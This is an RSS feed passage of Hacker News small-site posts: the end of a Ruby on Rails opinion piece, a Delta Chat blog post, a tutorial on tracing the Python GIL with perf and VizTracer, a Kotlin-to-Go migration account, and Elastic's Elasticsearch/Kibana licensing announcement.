<p><span>It's funny, but you almost never see books or articles about how to develop with RoR in an agile way - it's as if <strong>the agile development process is already part of RoR's DNA.</strong> RoR wins out precisely because it makes it as easy as possible to quickly make a change, and then test that change â€¦ time after time.</span></p>
<h3><strong>What is RoR not good for?</strong></h3>
<p><span>We prefer to be honest, and state clearly that RoR is not really a good option for the following edge-cases:</span></p>
<ul>
<li><span>Simple, static websites â€“ in this case, RoR is over-kill.</span></li>
<li><span>Websites which require only a few function calls to a simple backend.</span></li>
<li><span>Micro/services oriented architecture (M/SOA) - sooner rather than later, this pattern requires large maintenance teams.</span></li>
</ul>
<h3><span><strong>So what is RoR good for?</strong></span></h3>
<p><span>RoR is highly suitable for the vast majority of web applications, in particular:</span></p>
<ul>
<li><span>when you need a quick prototype (MVP),</span></li>
<li><span>any application for which you do not yet have a fixed concept, but you're looking for a framework which will allow you to later expand and pivot, as your business needs change,</span></li>
<li><span>standard web applications,</span></li>
<li><span>eCommerce applications,</span></li>
<li><span>custom database solutions, and</span></li>
<li><span>web applications which also leverage some specialist areas, such as Machine Learning or Blockchain - in this case, RoR is ideal in providing a high-performance framework, but connecting to algorithms written in some other language.</span></li>
</ul>
<p><span>With its focus on productivity, versatility, and stability at scale it's clear that <strong>RoR will be a great choice for developing most web applications for the foreseeable future.</strong></span></p>

</div></div>]]>
            </description>
            <link>https://themasters.io/blog/posts/is-ruby-on-rails-already-dead</link>
            <guid isPermaLink="false">hacker-news-small-sites-25778256</guid>
            <pubDate>Thu, 14 Jan 2021 16:26:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Email is the messenger you should migrate to]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25778233">thread link</a>) | @jlelse
<br/>
January 14, 2021 | https://jlelse.blog/posts/email-messenger-delta-chat | <a href="https://web.archive.org/web/*/https://jlelse.blog/posts/email-messenger-delta-chat">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><data value="https://jlelse.blog/posts/email-messenger-delta-chat"></data><div><p>Published on <time datetime="2021-01-14T17:23:36+01:00">January 14, 2021</time> in <a href="https://jlelse.blog/posts">✍️ Posts</a></p></div><div><p>Today I have heard again a discussion about WhatsApp, Telegram, Signal and Threema and there was the question to which messenger one would switch from WhatsApp.</p><p>While I find Telegram very pleasant as an everyday messenger, since it offers me the best user experience and also has some features (bots, channels) that other messengers don’t have, <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Delta Chat came to mind again</a>.</p><p>Everyone has an email address, email is decentralized and Delta Chat encrypts messages automatically.</p><blockquote><p>What I really like about this is, that using the existing email infrastructure enables everyone to communicate with each other without the restriction to use the same messenger or client. Anyone can choose any client and can still be connected. Just login with your usual email account. You don’t even need to use one of those messaging optimized clients and stay with your regular email client.</p><p>– <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Jan-Lukas Else (2019)</a></p></blockquote><p>I installed <a href="https://delta.chat/" target="_blank" rel="noopener">Delta Chat</a> on my smartphone again today. While the app wasn’t quite mature 2 years ago, I have to say it’s pretty decent now. The Android app seems to be based on the Signal interface. But Delta Chat is also available for desktops (Windows, macOS and Linux) and iOS. And the best part - something Signal, Threema and WhatsApp have problems with - Delta Chat can be used from multiple devices without any problems.</p><p>But the most important thing: Delta Chat allows you to communicate even with people who don’t use Delta Chat at all, all you need is an email address! If you write to someone without Delta Chat, they will just get a normal email. I would argue that even beats Matrix or XMPP.</p><p>Conclusion: If you are concerned about security when chatting and would rather use a decentralized messenger (no silo), you are in good hands with email and Delta Chat.</p><p>However, it would be advisable not to use Gmail, Outlook or GMX as email service, but a reasonable email service. I use <a href="https://www.servercow.de/mailcow?lang=en" target="_blank" rel="noopener">mailcow</a> for example, where just today there was <a href="https://mailcow.email/2021/01/14/back-to-the-future-with-delta-chat/" target="_blank" rel="noopener">an announcement about Delta Chat</a>.</p></div><p><b>Tags</b>:
<a rel="tag" href="https://jlelse.blog/tags/delta-chat">Delta Chat</a>
<a rel="tag" href="https://jlelse.blog/tags/email">Email</a>
<a rel="tag" href="https://jlelse.blog/tags/messenger">Messenger</a>
<a rel="tag" href="https://jlelse.blog/tags/opinion">Opinion</a></p></article></div></div>]]>
            </description>
            <link>https://jlelse.blog/posts/email-messenger-delta-chat</link>
            <guid isPermaLink="false">hacker-news-small-sites-25778233</guid>
            <pubDate>Thu, 14 Jan 2021 16:24:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracing the Python GIL]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25777423">thread link</a>) | @mariuz
<br/>
January 14, 2021 | https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html | <a href="https://web.archive.org/web/*/https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div>

<p>There are plenty of articles explaining why the Python GIL (The Global Interpreter Lock) exists<sup id="fnref-1"><a href="#fn-1">1</a></sup>, and why it is there. The TLDR version is: the GIL prevents multithreaded pure Python code from using multiple CPU cores.</p>
<p>However, in <a href="https://vaex.io/">Vaex</a> we execute most of the CPU intensive parts in C (C++) code, where we release the GIL. This is a common practice in high-performance Python libraries, where Python acts merely as a high-level glue.</p>
<p>However, the GIL needs to be released explicitly, and this is the responsibility of the programmer and might be forgotten, leading to suboptimal use of your machine.</p>
<p>I recently had this issue in <a href="https://github.com/vaexio/vaex/pull/1114">Vaex</a> where I simply forgot to release the GIL and found a similar issue in <a href="https://github.com/apache/arrow/pull/7756">Apache Arrow</a><sup id="fnref-2"><a href="#fn-2">2</a></sup>.</p>
<p>Also, when running on 64 cores, I sometimes see a performance in Vaex that I am not happy with. It might be using 4000% CPU, instead of 6400% CPU, which is something I am not happy with. Instead of blindly pulling some levers to inspect the effect, I want to understand what is happening, and if the GIL is the problem, why, and where is it holding Vaex down.</p>


</div>
</div>
</div><div>
<div>
<div>

<p>I'm planning to write a series of articles explaining some tools and techniques available for profiling/tracing Python together with native extensions, and how these tools can be glued together, to analyze and visualize what Python is doing, and when the GIL it taken or dropped.</p>
<p>I hope this leads to improvement of tracing, profiling, and other performance tooling in the Python ecosystem, and the performance of the whole Python ecosystem.</p>

<h2 id="Linux">
Linux<a href="#Linux"> </a>
</h2>
<p>Get access to a Linux machine, and make sure you have root privileges (sudo is fine), or ask your sysadmin to execute some of these commands for you. For the rest of the document, we only run as user.</p>
<h2 id="Perf">
Perf<a href="#Perf"> </a>
</h2>
<p>Make sure you have perf installed, e.g. on Ubuntu:</p>

<pre><code>$ sudo yum install perf</code></pre>
<h2 id="Kernel-configuration">
Kernel configuration<a href="#Kernel-configuration"> </a>
</h2>
<p>To enable running it as a user:</p>

<pre><code># Enable users to run perf (use at own risk)
$ sudo sysctl kernel.perf_event_paranoid=-1

# Enable users to see schedule trace events:
$ sudo mount -o remount,mode=755 /sys/kernel/debug
$ sudo mount -o remount,mode=755 /sys/kernel/debug/tracing</code></pre>
<h2 id="Python-packages">
Python packages<a href="#Python-packages"> </a>
</h2>
<p>We will make use of <a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a> and <a href="https://github.com/maartenbreddels/per4m">per4m</a></p>

<pre><code>$ pip install "viztracer&gt;=0.11.2" "per4m&gt;=0.1,&lt;0.2"</code></pre>

</div>
</div>
</div><div>
<div>
<div>

<p>There is no way to get the GIL state in Python <sup id="fnref-3"><a href="#fn-3">1</a></sup> since there is no API for this. We can track it from the kernel, and the right tool for this under Linux is <strong>perf</strong>.</p>
<p>Using the linux perf tool (aka perf_events), we can listen to the state changes for processes/threads (we only care about sleeping and running), and log them. Although perf may look scary, it is a powerful tool. If you want to know a bit more about perf, I recommend reading <a href="https://jvns.ca/blog/2018/04/16/new-perf-zine/">Julia Evans' zine on perf</a> or <a href="http://www.brendangregg.com/perf.html">go through Brendan Gregg's website</a>.</p>
<p>To build our intuition, we will first run perf on a <a href="https://github.com/maartenbreddels/per4m/blob/master/per4m/example0.py">very trivial program</a>:</p>


</div>
</div>
</div><div>
<div>
<div>
<p>We listen to just a few events to keep the noise down (note the use of wildcards):</p>

<pre><code>$ perf record -e sched:sched_switch  -e sched:sched_process_fork \
        -e 'sched:sched_wak*' -- python -m per4m.example0
[ perf record: Woken up 2 times to write data ]
[ perf record: Captured and wrote 0,032 MB perf.data (33 samples) ]</code></pre>
<p>And use the <code>perf script</code> command to write human/parsable output.</p>

<pre><code>$ perf script
        :3040108 3040108 [032] 5563910.979408:                sched:sched_waking: comm=perf pid=3040114 prio=120 target_cpu=031
        :3040108 3040108 [032] 5563910.979431:                sched:sched_wakeup: comm=perf pid=3040114 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995616:                sched:sched_waking: comm=kworker/31:1 pid=2502104 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995618:                sched:sched_wakeup: comm=kworker/31:1 pid=2502104 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995621:                sched:sched_waking: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995622:                sched:sched_wakeup: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995624:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=R+ ==&gt; next_comm=kworker/31:1 next_pid=2502104 next_prio=120
          python 3040114 [031] 5563911.003612:                sched:sched_waking: comm=kworker/32:1 pid=2467833 prio=120 target_cpu=032
          python 3040114 [031] 5563911.003614:                sched:sched_wakeup: comm=kworker/32:1 pid=2467833 prio=120 target_cpu=032
          python 3040114 [031] 5563911.083609:                sched:sched_waking: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563911.083612:                sched:sched_wakeup: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563911.083613:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=R ==&gt; next_comm=ksoftirqd/31 next_pid=198 next_prio=120
          python 3040114 [031] 5563911.108984:                sched:sched_waking: comm=node pid=2446812 prio=120 target_cpu=045
          python 3040114 [031] 5563911.109059:                sched:sched_waking: comm=node pid=2446812 prio=120 target_cpu=045
          python 3040114 [031] 5563911.112250:          sched:sched_process_fork: comm=python pid=3040114 child_comm=python child_pid=3040116
          python 3040114 [031] 5563911.112260:            sched:sched_wakeup_new: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040114 [031] 5563911.112262:            sched:sched_wakeup_new: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040114 [031] 5563911.112273:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
          python 3040116 [037] 5563911.112418:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112450:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112473: sched:sched_wake_idle_without_ipi: cpu=31
         swapper     0 [031] 5563911.112476:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040114 [031] 5563911.112485:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
          python 3040116 [037] 5563911.112485:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112489:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112496:                sched:sched_switch: prev_comm=python prev_pid=3040116 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/37 next_pid=0 next_prio=120
         swapper     0 [031] 5563911.112497:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040114 [031] 5563911.112513:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
         swapper     0 [037] 5563912.113490:                sched:sched_waking: comm=python pid=3040116 prio=120 target_cpu=037
         swapper     0 [037] 5563912.113529:                sched:sched_wakeup: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040116 [037] 5563912.113595:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563912.113620:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
         swapper     0 [031] 5563912.113697:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031</code></pre>

</div>
</div>
</div><div>
<div>
<div>
<p>Take a moment to digest the output. I can see a few things. Looking at the 4th column (time in seconds), we can see where the program slept (it skips 1 second). Here we see that we enter the sleeping state with a line like:</p>
<p><code>python 3040114 [031] 5563911.112513:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120</code></p>
<p>This means the kernel changed the state of the Python thread to <code>S</code> (=sleeping) state.</p>
<p>A full second later, we see it being woken up:</p>
<p><code>swapper     0 [031] 5563912.113697:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031</code></p>
<p>Of course, you need to build some tooling around this, to really see what is happening. But one can imagine this output can be easily parsed and this is what <a href="https://github.com/maartenbreddels/per4m/">per4m</a> does. However, before we go there, I'd first like to visualize the flow of a slightly more advanced program using <a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a>.</p>

</div>
</div>
</div><div>
<div>
<div>

<p><a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a> is a Python tracer that can visualize what your program does in the browser. Let us run it on a slightly <a href="https://github.com/maartenbreddels/per4m/blob/master/per4m/example1.py">more advanced example</a> to see what it looks like.</p>

</div>
</div>
</div><div>
<div>
<div>
<p>Running viztracer gives output like:</p>

<pre><code>$ viztracer -o example1.html --ignore_frozen -m per4m.example1
Loading finish                                        
Saving report to /home/maartenbreddels/github/maartenbreddels/per4m/example1.html ...
Dumping trace data to json, total entries: 94, estimated json file size: 11.0KiB
Generating HTML report
Report saved.</code></pre>
<p>And the HTML should render as:
<img src="https://www.maartenbreddels.com/images/copied_from_nb/per4m/example1.png" alt="image.png"></p>
<p>From this, it seems that <code>some_computation</code> seem to be executed in parallel (twice), while in fact, we know the GIL is preventing that. So what is really going on?</p>

</div>
</div>
</div><div>
<div>
<div>

<p>Let us run <code>perf</code> on this, similarly to what we did to example0.py. However, we add the argument <code>-k CLOCK_MONOTONIC</code> so that we use <a href="https://github.com/gaogaotiantian/viztracer/blob/3321ba4024afe5623f938a601d7f7db3b08f534d/src/viztracer/modules/snaptrace.c#L91">the same clock as VizTracer</a> and ask VizTracer to generate a JSON, instead of an HTML file:</p>

<pre><code>$ perf record -e sched:sched_switch  -e sched:sched_process_fork -e 'sched:sched_wak*' \
   -k CLOCK_MONOTONIC  -- viztracer -o viztracer1.json --ignore_frozen -m per4m.example1</code></pre>
<p>Then …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html">https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html</a></em></p>]]>
            </description>
            <link>https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25777423</guid>
            <pubDate>Thu, 14 Jan 2021 15:26:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why We Moved from Kotlin and Spring Boot to Go]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25777076">thread link</a>) | @foxgrover
<br/>
January 14, 2021 | https://blog.astradot.com/why-we-moved-from-kotlin-spring-boot-to-go/ | <a href="https://web.archive.org/web/*/https://blog.astradot.com/why-we-moved-from-kotlin-spring-boot-to-go/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>Our product completely supports Java and we love Java developers. However, internally for our own code, we believe <a href="https://movingfulcrum.com/the-era-of-the-jvm-is-coming-to-an-end/">the era of the JVM is coming to an end</a>.</p><p>We found these 3 things initially attractive about Go:</p><ol><li>Instant compile times and program startup for faster development</li><li>Virtual threads for dealing with high concurrency workloads</li><li>Value types to better control memory usage</li></ol><p>We found a ton more to like later, but this was enough to give it a go.</p><h3 id="hurdles">Hurdles</h3><p>Right off the bat, Go's compile-time enforced formatting rules and casing of variables seemed like a weird choice. However, soon after I warmed up to them knowing that they enforced a certain amount of code uniformity across our codebase.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Why does Golang use identifer capitalization for public/private visibility? This seemed like an insane design decision to me. Now I realize. Go is simply saying 'Naming conventions are not guidelines, they are rules'. Uniform naming conventions across 100% of Go code is good.</p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1346528650137538560?ref_src=twsrc%5Etfw">January 5, 2021</a></blockquote>

</figure><p>The biggest hurdle though was the lack of an equivalent of a Spring Framework for Go. While the Go ecosystem has multiple libraries for all kinds of functionality, there didn't seem to be a standard way of doing things like logging, dependency injection, environment configuration, etc. We had to solve this before we could adopt Go in a major way in our organization. Thus, alongside developing the first few microservices, we kept working on an in-house framework, Gallium. The Gallium Framework could use a blog post of its own. In short, it standardizes on some libraries in the &nbsp;Go ecosystem for things like Logging, DI, etc, and makes it easy to structure microservices for our environment. We keep evolving Gallium with learnings from each Go microservice we develop.</p><p>We do miss <a href="https://blog.astradot.com/why-we-use-jooq-instead-of-hibernate/">JOOQ</a> though. <code>goqu</code> comes close, but its not the same.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">I would gladly pay for a version of <a href="https://twitter.com/JavaOOQ?ref_src=twsrc%5Etfw">@JavaOOQ</a> that generated Golang code</p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1342940430799785984?ref_src=twsrc%5Etfw">December 26, 2020</a></blockquote>

</figure><p>Also, the <code>time</code> package could use some improvements:</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Golang not parsing ISO8601 Durations seems like a weird omission</p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1345158151146938368?ref_src=twsrc%5Etfw">January 2, 2021</a></blockquote>

</figure><p>Though, its still a <em>lot</em> better than the <code>java.time</code> insanity:</p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>Java 8's 'new' Time API:</p><p>Wanna store time? Pick from</p><p>1. Instant<br>2. LocalDateTime<br>3. OffsetDateTime<br>4. ZonedDateTime<br>5. LocalTime<br>6. OffsetTime<br>7. LocalDate</p><p>Wanna store ISO Period? Pick from</p><p>1. Period<br>2. Duration</p><p>LuxonJS OTOH:</p><p>- DateTime<br>- Duration</p><p>Does work of all 9 above</p></div>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1163917935431127041?ref_src=twsrc%5Etfw">August 20, 2019</a></blockquote>

</figure><h3 id="in-the-land-of-magic">In the land of magic</h3><p>We took one of our simpler but high throughout Spring Boot service called <code>metric-query</code> and converted it to Go. <code>metric-query</code> takes in queries from our dashboard and runs them against our metric database. Since our dashboards refresh every 2 seconds, it can get a lot of requests at once. In the JVM world, each of these requests would spawn a whole thread.</p><p>After converting to Golang, we saw the memory usage drop by 40x! We had to double-check that our charts were not faulty.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Converted a high throughput service from Kotlin &amp; Spring Boot to Golang. Memory usage went down from ~800MB per instance to ~20MB per instance!! <a href="https://t.co/KATZenY8OG">pic.twitter.com/KATZenY8OG</a></p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1345525850670649344?ref_src=twsrc%5Etfw">January 3, 2021</a></blockquote>

</figure><p>This convinced us we were &nbsp;on the right path and the investment in Go was worth it.</p><p>We then converted our highest throughout service, <code>metric-collector</code>. It ingests data from all our agents and puts it on Kafka. It receives a ton of requests all at the same time. The Spring Boot version was maxing the CPU on the nodes it was deployed and eating up tons of memory. &nbsp;Latency was all over the place.</p><p>Converting it to Go and watching the graphs was pure magic. CPU usage and latency dropped to almost nothing. Memory usage dropped to insignificant levels. This could be a case study for virtual threads.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Kafka producer latency after switching ultra high throughput app from Kotlin to Golang. The latency graph almost feels like it disappears after the switch. <a href="https://t.co/kewMpkh4tQ">pic.twitter.com/kewMpkh4tQ</a></p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1347745009085210626?ref_src=twsrc%5Etfw">January 9, 2021</a></blockquote>

</figure><figure><blockquote data-width="550"><p lang="en" dir="ltr">Finished migrating the ultra high throughput service from Kotlin to Golang. Memory usage went from 3.1GB to 125MB! <a href="https://t.co/ioVLssxnMz">pic.twitter.com/ioVLssxnMz</a></p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1348142023451176960?ref_src=twsrc%5Etfw">January 10, 2021</a></blockquote>

</figure><p>We have continued converting each microservice from Kotlin/Spring Boot to Go and its magical each time watching those graphs drop.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Cant get enough of seeing the graphs change as I switch a service from Kotlin to Go <a href="https://t.co/kS2nNPRv29">pic.twitter.com/kS2nNPRv29</a></p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1348946882916089856?ref_src=twsrc%5Etfw">January 12, 2021</a></blockquote>

</figure><h3 id="looking-back-at-jvm-world">Looking back at JVM world</h3><p>I have been programming on the JVM for almost 2 decades. Switching to Go was quite a change for me personally too.</p><p>But looking back, the Java/Spring world seems to be toppling to maintain compatibility with all its legacy. It is mind-boggling to think a microservice in 2021 still needs Tomcat to run. Spring MVC is layers and layers of code to get Java Servlets, which were released in 1996, somehow feel relevant in 2021. Kotlin is another massive layer to make Java feel like a modern language.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">I remember writing this Spring MVC code and thinking it was so clean. Now that my blinders are off, it feels like a messy DSL built on annotations. No way to step through flow of logic. To do anything, I need to find appropriate annotation by digging through docs. Its a black box <a href="https://t.co/onwwkx4mjk">pic.twitter.com/onwwkx4mjk</a></p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1349604496490446849?ref_src=twsrc%5Etfw">January 14, 2021</a></blockquote>

</figure><p>The Maven/Gradle build system seems like a ridiculous, unnecessary complexity compared to Go's dependency management.</p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>It is so liberating to be free of the complexity of Maven/Gradle/NPM/Webpack. </p><p>All one really needs to build a project is a text files with dependencies listed on each line. I just do a `go build` and it produces a binary. I dont need to read an entire book to build my project. <a href="https://t.co/MySfY6p8jv">pic.twitter.com/MySfY6p8jv</a></p></div>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1347358703440121859?ref_src=twsrc%5Etfw">January 8, 2021</a></blockquote>

</figure><p>The JVM, Java, and Spring were great for an era indeed. In 2021, they feel like an 80-yr old trying to compete in the Olympics by taking artificial performance enhancing drugs. Switching to Go feels like a refreshing, exciting change.</p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>converting a service from Kotlin/SpringBoot to Golang feels like stepping into the future.</p><p>- Instant compilation<br>- Instant startup<br>- No special code to make async queries<br>- No worrying about too many threads</p><p>I encourage everyone to try it</p></div>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1343391654623944705?ref_src=twsrc%5Etfw">December 28, 2020</a></blockquote>

</figure>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.astradot.com/why-we-moved-from-kotlin-spring-boot-to-go/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25777076</guid>
            <pubDate>Thu, 14 Jan 2021 15:02:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Licensing changes to Elasticsearch and Kibana]]>
            </title>
            <description>
<![CDATA[
Score 289 | Comments 359 (<a href="https://news.ycombinator.com/item?id=25776657">thread link</a>) | @sl_
<br/>
January 14, 2021 | https://www.elastic.co/blog/licensing-change | <a href="https://web.archive.org/web/*/https://www.elastic.co/blog/licensing-change">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><h2>Upcoming licensing changes to Elasticsearch and Kibana</h2><p>We are moving our Apache 2.0-licensed source code in Elasticsearch and Kibana to be dual licensed under Server Side Public License (SSPL) and the Elastic License, giving users the choice of which license to apply. This license change ensures our community and customers have free and open access to use, modify, redistribute, and collaborate on the code. It also protects our continued investment in developing products that we distribute for free and in the open by restricting cloud service providers from offering Elasticsearch and Kibana as a service without contributing back. This will apply to all maintained branches of these two products and will take place before our upcoming 7.11 release. Our releases will continue to be under the Elastic License as they have been for the last three years.
</p><p>This change in source code licensing has <b>no impact on the overwhelming majority of our user community</b> who use our default distribution for free. It also has <b>no impact on our cloud customers or self-managed software customers</b>.</p><p>In recent years, the market has evolved, and the community has come to appreciate that open source companies need to better protect their software to continue to innovate and make the investments required. As companies continue the shift to SaaS offerings, some cloud service providers have taken open source products and provided them as a service without investing back into the community. Moving to the dual license strategy with <a href="https://www.mongodb.com/licensing/server-side-public-license">SSPL</a> or the Elastic License is a natural next step for us after opening our commercial code and creating a free tier, all under the Elastic License, nearly 3 years ago. It is similar to those made by many other open source companies over these years, including <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">MongoDB</a>, which developed the SSPL. The SSPL allows free and unrestricted use, as well as modification, with the simple requirement that if you provide the product as a service, you must also publicly release any modifications as well as the source code of your management layers  under SSPL.
</p><h2>Our open origins</h2><p>My personal journey with open source goes a long way back. In 2005, I open sourced my first project, Compass, to provide a Java framework on top of Apache Lucene while I was building a recipe app for my wife. In the following five years, I invested many weekends and nights working on it, from writing code to helping users with bugs, features, and questions.
</p><p>I had no idea what I was signing up for, especially with a day job “on the side,” but I fell in love with the opportunity to make such a positive impact — trying to build a great product, but more importantly, a great community around it, through the power of open source.
</p><p>In 2009, I decided to do it again, and started to write a brand new project called Elasticsearch. I spent many nights and weekends building it, and in 2010 open sourced it. I even quit my job and decided to dedicate my full attention to it. To be there for the users, through writing code, and engaging on GitHub, mailing lists, and IRC.
</p><p>And when we founded Elastic as a company in 2012, we brought the same spirit to our company. We invested heavily in our free and open products, and supported the rapid growth of our community of users. We expanded from just Elasticsearch to Kibana, Logstash, Beats, and now a complete set of solutions built into the Elastic Stack: Elastic Enterprise Search, Observability, and Security.
</p><p>We have matured the products, fostered vibrant communities around them, and focused on providing the greatest amount of value to our users. Today, we have hundreds of engineers who wake up every day and work to make our products even better. And we have hundreds of thousands of community members who engage with us and contribute to our shared success.
</p><p>I am proud of the company we built, and humbled by the level of trust that we have earned with our user base. This starts by being open and transparent, and continues with being true to our community and user base in our choices.
</p><h2>Free and open FTW</h2><p>Back in 2018, we <a href="https://www.elastic.co/blog/doubling-down-on-open">opened the code of our free and paid proprietary features</a> under the Elastic License, a source-available license, and we changed our default distribution to include all of our features, with all free features enabled by default.
</p><p>We did this for a few reasons. It allowed us to engage with our paying customers in the same way we engage with our community: in the open. It also allowed us to build free features that empower our users without providing those capabilities to companies that take our products and provide them as a service, like Amazon Elasticsearch Service, and profit from our open source software without contributing back.
</p><p>This approach was well received — today, over 90% of new downloads choose this distribution — and has allowed us to make so much of our work available for free while also building a successful company.
</p><p>The list of improvements under this new free and open, yet proprietary, license, is overwhelming. I am humbled by the amazing progress our team and community has made across all our products, so much so that I would love to share some of them:
</p><p>We've dramatically improved the speed, scalability, and reliability of Elasticsearch, with a new distributed consensus algorithm and significantly reduced memory usage, in addition to new data storage and compression approaches that have reduced the typical index size by nearly 40% while improving indexing and query throughput. We added new field types for geospatial analysis, and more efficient ways to store and search logs and perform fast, case-insensitive search on security data. In Kibana, we cut load time by 80% and eliminated whole-page refreshes thanks to a multiyear replatforming project, while at the same time introducing an intuitive drag-and-drop data visualization experience with Kibana Lens, key capabilities like dashboard drill-downs, and so much more.
</p><p>Over the last three years, we also built first-class experiences around our most common use cases. In the security area, we created a free and open SIEM right inside Kibana, with a powerful detection engine that supports simple rules as well as complex correlations via a new query language called EQL in Elasticsearch. We include hundreds of detection rules, which we develop publicly, in collaboration with our community. And we joined forces with Endgame, a leading endpoint security company, and have released powerful malware protection for free as part of the Elastic Agent, our unified, centrally managed observability and security agent for servers and endpoints, with more to come.
</p><p>In observability, the story is similar. We've built an entire observability suite right inside Kibana — from a live-tail logging UI to an intuitive infrastructure-level view of the key metrics and alerts across your hosts, pods, and containers. And we now have a fully featured APM product with open source data collectors and agents, supporting OpenTelemetry, real user monitoring (RUM), synthetic monitoring, and the recent addition of user experience monitoring.
</p><p>With Elastic Enterprise Search, we introduced App Search, a layer on top of Elasticsearch that simplifies building rich applications and provides powerful management interfaces for relevance tuning, as well as analytics on how it's being used. We also provide a free Workplace Search product that makes it easy to integrate and search the content sources that you use to run your life or company, like Google Workplace, Microsoft 365, Atlassian Jira and Confluence, and Salesforce.
</p><p>It is simply amazing that we've been able to build all of these capabilities and provide them for free to our community. It has been humbling to see the level of engagement and adoption around our products and how these new features have helped so many people and businesses succeed. And this was possible because the overwhelming majority of our community chose our default distribution under the Elastic License, where all these features are free and open.
